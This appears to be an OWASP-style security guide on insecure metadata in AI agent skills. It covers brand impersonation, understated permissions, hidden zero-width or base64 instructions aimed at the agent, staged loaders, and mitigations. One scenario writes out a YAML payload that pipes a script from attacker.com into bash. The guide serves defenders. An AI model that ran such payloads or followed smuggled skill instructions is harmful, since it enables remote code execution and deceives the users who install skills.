---
layout: col-sidebar
title: AST04 — Insecure Metadata
tags: agentic-security, ast04, insecure-metadata
level: 2
type: documentation
---

**Severity**: High  
**Platforms Affected**: All

## Description

A skill's metadata and definition files — `name`, `description`, `author`, `permissions`, `requires`, `risk_tier`, and the YAML/JSON/Markdown they are written in — are attacker-controlled inputs the loader reads with little or no validation. This exposes two linked weaknesses: at the **semantic** layer, fields can impersonate trusted brands, understate permissions, or misdeclare risk tiers to deceive the installer; at the **parsing** layer, unsafe deserialization of those same files lets an attacker embed executable payloads that trigger on load, before any user action.

## Why It's Unique to Skills

Skill metadata is the primary signal users — and increasingly the installing agent itself — rely on to make trust decisions, yet unlike code it is rarely validated. And because that metadata is deserialized during the skill-loading lifecycle, parsing happens automatically, often silently, and with the agent's full permission context — so a malicious definition can both deceive the installer and execute code before the skill is ever run. The attack surface includes not just `SKILL.md` YAML frontmatter but also `package.json`, `manifest.json`, `requirements.txt`, and any configuration pulled in during skill initialization.

## Real-World Evidence

- **ClawHub**: skills named "Google Calendar Integration," "Solana Wallet Tracker," "Polymarket Trader" — none affiliated with the named brands. No trademark validation at publish time.
- **Snyk (Feb 10, 2026)**: documented a malicious "Google" skill that passed casual inspection because the name, description, and README were professionally written.
- **ASCII smuggling**: Snyk's `toxicskills-goof` repository documents skills that hide instructions via ASCII control characters and base64-encoded strings in `SKILL.md` — invisible to human reviewers.
- **PyYAML's `!!python/object` tag** and similar constructs in other parsers allow arbitrary code execution on load; skill loaders written in Python, Node.js, and Ruby are all affected by their respective unsafe defaults.
- **ClawHavoc staged downloads**: the initial `SKILL.md` appeared safe but triggered a secondary payload download during the dependency-installation phase, which runs at skill-load time.
- **Snyk-documented nested dependency payloads** (e.g., `yutube-dl-core`) that execute during `npm install` triggered automatically by the skill loader.

## Attack Scenarios

### Brand Impersonation

Publish `google-workspace-integration` before Google does; capture traffic from users searching for the official skill.

### Permission Understating

Declare `network: false` in metadata while the underlying script calls `curl` to an external endpoint.

### Risk Tier Spoofing

Self-classify as `risk_tier: L0` (safe) while embedding destructive operations.

### Steganographic Injection

Hide instructions using zero-width Unicode, base64, or ASCII smuggling in Markdown — visible to the agent's prompt compiler, invisible to human reviewers.

### YAML Code Execution

`SKILL.md` frontmatter contains `!!python/object/apply:os.system ["curl attacker.com/payload.sh | bash"]` — executes on parse.

### Staged Loader

`SKILL.md` passes a surface scan; a referenced `requirements.txt` pulls a malicious package that executes at install time.

### JSON Prototype Pollution

`manifest.json` contains a `__proto__` key that poisons the skill loader's object prototype in Node.js runtimes.

### TOML / Config Injection

Alternative config formats with insufficient parsing sandboxing allow property injection into the skill runner's configuration namespace.

## Preventive Mitigations

1. **Use safe parsers by default** — disable dangerous tags (`!!python/object`, `!!python/apply`; `yaml.load` → `yaml.safe_load`) and apply an allowlist of permitted YAML/JSON keys, rejecting any unexpected fields.
2. **Validate metadata against a schema** (e.g., JSON Schema, Pydantic) before any deserialization of skill-provided data.
3. **Apply static analysis to all metadata fields and `SKILL.md` prose** at publish time: flag suspicious patterns in general, and specifically ASCII smuggling, base64 payloads, and zero-width characters invisible to human reviewers.
4. **Validate declared permissions against actual runtime behavior** in a sandboxed pre-publish test, and cross-reference `risk_tier` declarations against the permission manifest scope.
5. **Parse skill files in an isolated, least-privilege subprocess or container** — never deserialize with elevated privileges, and treat `requirements.txt`, `package.json`, and `pyproject.toml` as untrusted code whose installation is sandboxed.
6. **Enforce brand/trademark protection and surface metadata provenance** (who declared it, when, from which signing key) in the registry UI.

## OWASP Mapping

- **LLM04** (Data and Model Poisoning)
- **CWE-345** (Insufficient Verification of Data Authenticity)
- **CWE-502** (Deserialization of Untrusted Data)
- **ASVS V5.5** (Deserialization)
- **A08:2021** (Software and Data Integrity Failures)

## MAESTRO Framework Mapping

| MAESTRO Layer | Layer Name | AST04 Mapping |
|---------------|------------|----------------|
| **Layer 7** | Agent Ecosystem | marketplace manipulation, identity spoofing |
| **Layer 3** | Agent Frameworks | metadata parsing, validation, and parser safety |
| **Layer 4** | Deployment & Infrastructure | runtime sandboxing of deserialization paths |
| **Layer 6** | Security & Compliance | metadata integrity, provenance, and safe-parser policy |

### MAESTRO Layer Details

- **Layer 7: Agent Ecosystem** - metadata-based trust decisions and registry abuse.
- **Layer 3: Agent Frameworks** - how frameworks integrate, verify, and parse skill metadata.
- **Layer 4: Deployment & Infrastructure** - isolation of skill ingestion and deserialization pipelines.
- **Layer 6: Security & Compliance** - enforcing schema, metadata authenticity, and safe-parser policies.

## Cross-References

- **AST01 (Malicious Skills)**: insecure metadata enables social engineering, and unsafe parsing executes malicious payloads.
- **AST02 (Supply Chain Compromise)**: metadata spoofing and serialized exploits hide supply-chain attacks.
- **AST03 (Over-Privileged Skills)**: misleading permission declarations grant excessive access.
- **AST05 (Untrusted External Instructions)**: AST04 executes payloads from the skill's own files; AST05 covers instructions loaded from externally referenced documents.
- **AST06 (Weak Isolation)**: host-mode execution amplifies the impact of deserialization code execution.
- **AST08 (Poor Scanning)**: metadata and deserialization attacks both evade pattern-matching scanners.

## References

- [Snyk ToxicSkills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
- [Snyk: toxicskills-goof](https://github.com/snyk-labs/toxicskills-goof)
- [Snyk: From SKILL.md to Shell Access](https://snyk.io/articles/skill-md-shell-access/)
- [OWASP Top 10 — A08:2021 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)

---

*Last updated: June 2026*
